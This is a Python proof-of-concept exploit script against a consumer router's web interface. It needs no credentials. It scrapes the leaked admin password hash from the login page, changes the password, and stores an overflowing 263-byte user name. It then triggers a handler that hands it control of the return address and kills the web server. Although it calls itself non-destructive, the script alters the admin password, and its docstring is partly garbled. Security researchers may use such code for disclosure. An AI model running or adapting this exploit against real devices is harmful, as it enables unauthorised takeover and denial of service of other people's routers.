#!/usr/bin/env python3
"""03 — zero-credential chain to return-address control (NON-DESTRUCTIVE variant).
usage: ./03_zero_auth_overflow.py <router-ip> [exit|crash]
It leaks the password hash from the login page, stores a 263-byte user name through the
password-change handler and triggers /goform/ate. The *current* admin password is restored to the
same leaked value's plaintext is NOT attempted: the password is only used to authorise the write,
the device keeps working (it is the web server that dies).  Payload tail:
  exit  -> 0x004a4060 (exit@plt): the daemon exits cleanly  (proof of ra control)
  crash -> 0x00414141            : SIGSEGV                   (control comparison)
"""
import re, struct, subprocess, sys, urllib.parse, urllib.request
ip = sys.argv[1] if len(sys.argv) > 1 else "192.168.0.1"
mode = sys.argv[2] if len(sys.argv) > 2 else "exit"
base = f"http://{ip}"
html = urllib.request.urlopen(base + "/login.asp", timeout=8).read().decode("latin1")
m = re.search(r'str_decode\("([^"]+)"', html) or re.search(r'def_passwd\s*=\s*"([^"]+)"', html)
if not m: sys.exit("could not extract def_passwd from /login.asp")
leaked = m.group(1); print("[1] leaked password (base64):", leaked[:40])
tail = {b"exit": bytes([0x60,0x40,0x4a]), b"crash": bytes([0x41,0x41,0x41])}[mode.encode()]
payload = b"A"*260 + tail
open("/tmp/fh1201_payload.bin","wb").write(payload)
data = urllib.parse.urlencode({"GO":"system_password.asp","mitOldUSERNAME":"",
        "mitOldPASSWORD":leaked,"mitNewPASSWORD":"bmV3cGFzcw==","mitCfrmNewPASSWORD":"bmV3cGFzcw=="}).encode()
boundary = b"----fh1201"
body = (b"--"+boundary+b'\r\nContent-Disposition: form-data; name="mitNewUSERNAME"; filename="u.bin"\r\n'
        b"Content-Type: application/octet-stream\r\n\r\n" + payload + b"\r\n--"+boundary+b"--\r\n")
req = urllib.request.Request(base + "/goform/SysToolChangePwd/login.asp", data=body,
        headers={"Content-Type": f"multipart/form-data; boundary={boundary.decode()}"})
print("[2] storing 263-byte user name:", urllib.request.urlopen(req, timeout=10).status)
try:
    urllib.request.urlopen(base + "/goform/ate", timeout=10)
except Exception as e:
    print("[3] trigger /goform/ate:", type(e).__name__)
print(f"[4] payload tail = {tail.hex()} (mode={mode}); check whether the web UI still answers")
